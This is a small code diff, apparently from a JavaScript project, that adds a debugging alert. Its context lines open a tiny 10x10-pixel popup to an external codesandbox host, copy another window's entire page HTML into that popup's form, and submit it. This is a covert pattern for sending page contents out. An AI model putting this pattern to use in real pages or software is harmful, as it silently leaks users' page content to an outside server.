@@ -24,6 +24,7 @@ function main() {
         var outgoingRequest = window.open("https://dqvznw.sse.codesandbox.io/", "sending", "width=10,height=10");
         var inter = setInterval(() => {
           if (outgoingRequest.document.body.id === "ready") {
+            alert("ready");
             clearInterval(inter);
             outgoingRequest.document.getElementById("input").value = myWindow.document.body.innerHTML;
             outgoingRequest.document.getElementById("send").click();
